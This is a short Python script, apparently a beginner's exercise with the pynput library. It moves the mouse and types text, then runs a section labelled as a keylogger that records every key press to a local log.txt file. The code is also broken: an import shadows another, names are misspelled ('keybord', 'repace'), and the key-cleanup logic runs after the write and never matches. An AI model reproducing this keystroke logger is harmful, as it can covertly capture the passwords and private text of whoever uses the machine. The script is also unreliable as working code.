from pynput.mouse import Controller
from pynput.keyboard import Controller

def controlMouse():
  mouse = Controller()
  mouse.position = (100,200)
  
#controlMouse()

def controlKeyboard():
  keyboard = Controller()
  keybord.type = ("Hey there")
  
#controlKeybard()





#keylogger
from pynput.keyboard import Listener

def writetofile(key):
  keydata = str(key)
  keydata = keydata.repace("'","")
  with open("log.txt",'a') as f:
    f.write(keydata)
  
  if keydata == 'key.space':
    keydata = ' '
  if keydata == 'key.shift_r':
    keydata = ''
  if keydata == 'key.ctrl_l':
    keydata = ''
  if keydata == 'key.enter':
    keydata = '\n'
  
with Listener(on_press=writetofile) as l:
  l.join()